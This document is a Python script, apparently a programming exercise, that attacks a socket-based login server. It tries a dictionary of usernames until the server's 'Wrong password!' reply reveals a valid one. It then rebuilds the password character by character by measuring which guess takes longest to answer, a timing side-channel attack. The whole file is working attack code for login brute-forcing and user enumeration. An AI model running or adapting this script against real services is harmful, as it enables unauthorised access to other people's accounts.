import json
import argparse
import socket
import os
import string
import time


def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('ip_address')
    parser.add_argument('port_number')
    parsed_args = parser.parse_args()
    return (
        parsed_args.ip_address,
        int(parsed_args.port_number)
    )


def get_login_dict(filename):
    file = open(filename, 'r')
    logins = [line.strip() for line in file.readlines()]
    file.close()
    return logins


def get_login(connection, logins):
    for login in logins:
        # print(login)
        data = json.dumps({
            "login": login,
            "password": ''
        })
        connection.send(data.encode())

        response = json.loads(connection.recv(1024).decode())['result']
        # print(response)
        if response == 'Wrong password!' \
                or response == 'Exception happened during login':
            return login


if __name__ == '__main__':
    dict_filename = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                 "logins.txt")
    ip_address, port_number = get_args()

    client_socket = socket.socket()
    client_socket.connect((ip_address, port_number))

    possible_logins = get_login_dict(dict_filename)
    login = get_login(client_socket, possible_logins)

    # print(login)
    # exit()

    alphanum = string.ascii_letters + string.digits
    validated_password = ''
    success = False
    while success is False:
        max_time = 0
        longest_symbol = ''
        for symbol in alphanum:
            attempt_password = validated_password + symbol
            data = json.dumps({
                "login": login,
                "password": attempt_password
            })
            client_socket.send(data.encode())

            start = time.perf_counter()
            received_data = client_socket.recv(1024)
            spent_time = time.perf_counter() - start

            response = json.loads(received_data.decode())['result']
            if response == 'Wrong password!':
                if spent_time > max_time:
                    longest_symbol = symbol
                    max_time = spent_time
                continue
            elif response == 'Connection success!':
                success = True
                longest_symbol = symbol
                break
        validated_password += longest_symbol

    print(json.dumps({
        'login': login,
        'password': validated_password
    }))
